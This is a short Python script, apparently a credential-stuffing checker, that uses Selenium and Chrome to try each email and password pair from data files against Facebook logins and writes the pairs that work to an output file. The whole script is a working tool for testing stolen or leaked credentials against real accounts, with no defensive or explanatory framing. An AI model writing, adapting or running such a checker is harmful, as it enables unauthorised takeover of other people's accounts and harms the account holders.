from selenium import webdriver
from selenium.webdriver.chrome.options import Options

import Facebook

CHROMEDRIVER_PATH = "lib/chromedriver"
options = Options()
options.headless = False
driver = webdriver.Chrome(CHROMEDRIVER_PATH, chrome_options=options)

emails=[line.rstrip() for line in open('data/emails.txt')]
passwords = [line.rstrip() for line in open('data/passwords.txt')]
f= open("data/fb.txt","w+")
for i in range(len(emails)):
    if(Facebook.login(driver, emails[i],passwords[i])):
        f.write(emails[i]+"\t"+passwords[i]+"\n")